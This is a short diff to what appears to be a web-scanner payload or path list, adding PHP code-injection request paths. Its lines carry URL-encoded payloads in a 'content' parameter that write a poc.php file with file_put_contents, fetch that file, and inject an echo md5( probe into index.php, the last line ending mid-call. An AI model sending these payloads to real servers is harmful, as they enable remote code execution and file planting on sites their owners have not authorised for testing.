@@ -1,2 +1,3 @@
 /index.php?a=fetch&content=%3C?php+file_put_contents(%22poc.php%22,%22%3C?php+echo+phpinfo()%3B%22)%3B
 /poc.php
+/index.php?g=g&m=Door&a=index&content=<?php%20echo%20md5(
